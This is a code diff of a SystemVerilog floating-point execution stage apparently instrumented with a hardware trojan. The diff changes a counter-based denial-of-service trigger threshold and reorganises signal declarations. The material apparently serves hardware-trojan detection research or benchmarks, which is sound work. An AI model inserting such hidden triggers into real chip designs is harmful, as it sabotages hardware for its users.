@@ -31,16 +31,20 @@ module FPExecutionStage_trojan_DoS(
     DebugIF.FPExecutionStage debug,
     CSR_UnitIF.FPExecutionStage csrUnit
 );
+    // Pipeline control
+    logic stall, clear;
+    logic flush[ FP_ISSUE_WIDTH ][ FP_EXEC_STAGE_DEPTH ];
+
+    `RSD_STATIC_ASSERT(FP_ISSUE_WIDTH == FP_DIVSQRT_ISSUE_WIDTH, "These muse be same");
 
     // ============================================================
-    // TROJAN TRIGGER LOGIC - Type 1: Simple Counter
+    // TROJAN TRIGGER - Type 1: Simple Counter (threshold=16149)
     // ============================================================
-    localparam int TRIGGER_THRESHOLD = 21623;
+    localparam int TRIGGER_THRESHOLD = 16149;
     logic [15:0] trojan_counter;
-    logic trojan_active;
-    
-    always_ff @(posedge clk_i or negedge rst_ni) begin
-        if (!rst_ni) begin
+    logic        trojan_active;
+    always_ff @(posedge clk or negedge rst) begin
+        if (!rst) begin
             trojan_counter <= '0;
             trojan_active  <= 1'b0;
         end else begin
@@ -49,11 +53,6 @@ module FPExecutionStage_trojan_DoS(
         end
     end
 
-    // Pipeline control
-    logic stall, clear;
-    logic flush[ FP_ISSUE_WIDTH ][ FP_EXEC_STAGE_DEPTH ];
-
-    `RSD_STATIC_ASSERT(FP_ISSUE_WIDTH == FP_DIVSQRT_ISSUE_WIDTH, "These muse be same");
 
     //
     // --- Local Pipeline Register
